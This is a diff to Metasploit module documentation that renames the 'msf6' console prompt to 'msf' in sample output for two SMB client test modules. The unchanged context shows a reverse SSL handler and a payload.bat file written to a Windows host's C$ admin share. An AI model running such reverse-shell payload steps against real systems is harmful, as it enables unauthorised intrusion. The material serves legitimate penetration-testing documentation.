@@ -290,7 +290,7 @@ end
 msfconsole output:
 
 ```msf
-msf6 exploit(windows/smb/msf_smb_client_test) > options
+msf exploit(windows/smb/msf_smb_client_test) > options
 
 Module options (exploit/windows/smb/msf_smb_client_test):
 
@@ -319,7 +319,7 @@ Exploit target:
    0   Windows
 
 
-msf6 exploit(windows/smb/msf_smb_client_test) > run
+msf exploit(windows/smb/msf_smb_client_test) > run
 
 [*] Started reverse SSL handler on 172.16.60.1:4444
 [*] 172.16.60.128:445 - Create and write to Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
@@ -407,7 +407,7 @@ end
 msfconsole output:
 
 ```msf
-msf6 exploit(windows/smb/ruby_smb_client_test) > options
+msf exploit(windows/smb/ruby_smb_client_test) > options
 
 Module options (exploit/windows/smb/ruby_smb_client_test):
 
@@ -436,7 +436,7 @@ Exploit target:
    0   Windows
 
 
-msf6 exploit(windows/smb/ruby_smb_client_test) > run
+msf exploit(windows/smb/ruby_smb_client_test) > run
 
 [*] Started reverse SSL handler on 172.16.60.1:4444
 [*] 172.16.60.128:445 - Create and write to Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
